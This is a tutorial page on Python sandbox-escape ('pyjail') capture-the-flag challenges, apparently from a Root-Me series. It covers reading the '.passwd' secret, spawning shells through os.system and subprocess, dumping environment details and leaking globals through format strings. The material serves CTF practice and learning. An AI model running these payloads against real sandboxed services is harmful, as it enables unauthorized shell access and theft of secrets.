---
title: "08 — Reaching Files and Shell"
date: 2026-10-31
categories: [python-jail]
tags: [pyjail, python, security]
---
# 08 — Reaching Files and Shell

Once you have a real module namespace, real `builtins`, or `os`, the jail is
over. Choose the least noisy method that satisfies the challenge.

## Reading files

Via real builtins:
```python
builtins = g.get("__builtins__")   # real builtins dict
h = builtins.open("/path/to/.passwd")
print(h.read())
h.close()
```

Via os module:
```python
osmod = platform.os   # or from linecache
fd = osmod.open(path, 0)   # flags: 0 = O_RDONLY in Py2; use osmod.O_RDONLY
data = osmod.read(fd, 4096)
osmod.close(fd)
```

Via pathlib (Py3):
```python
builtins.open(path).read()
```

## Locating the target file

```python
osmod.getcwd()
osmod.listdir(".")
osmod.listdir(osmod.getcwd())
osmod.path.join(cwd, ".passwd")
```

Challenges usually store the secret as `.passwd` in the working directory or a
named subdirectory (`<challenge-directory>/.passwd`).

## Spawning a shell

```python
osmod.system("sh")
osmod.system("cat .passwd")
subprocess.call(["sh"])
__import__("os").system("sh")   # if __import__ is real
```

`python2_input` uses `__import__('os').system("cat .passwd")` directly because
Python 2 `input()` is `eval`.

## Environment and process info

```python
osmod.environ
osmod.getuid(), osmod.getgid()
osmod.uname()          # Py2
platform.platform()
sysmod.version
sysmod.executable
```

## Calling the challenge's own verifier

Some jails expose a function that checks a secret and prints the flag. Once you
recover the secret via code-object inspection, call it:
```python
exit(secret)            # python_pyjail_1
getout(password)        # python_pyjail_2
fk(magic_word)          # python_jail_garbage_collector
```

## When only text is available

If you can only *print* attributes (formatting route), exfiltrate by printing
the secret directly:
```python
print("{0.__globals__}".format(f))   # may include the secret in repr
```
Then parse the output.

## Output channels

- stdout/stderr of the jail (most common).
- Return value echoed by the REPL (`Result: ...`).
- File write + separate read (if you can write but not print).
- Network/DNS exfiltration (advanced; rarely needed on Root-Me).

## Minimizing noise

- Prefer reading files over spawning shells (challenges often say "shell is
  useless").
- Read only the needed bytes (`os.read(fd, 100)`).
- Avoid modifying challenge files.
- Keep payloads idempotent.

## Caveats

- The working directory of the service may differ from your SSH login dir.
  Use `os.getcwd()` from the service's own globals, not your shell.
- File permissions: the service runs as a specific user; read what that user
  can read.
- `open` may be shadowed in the jail's `__builtins__`; use the *real*
  builtins obtained via introspection.
- On Python 3, `os.open` flags differ; use `os.O_RDONLY`.

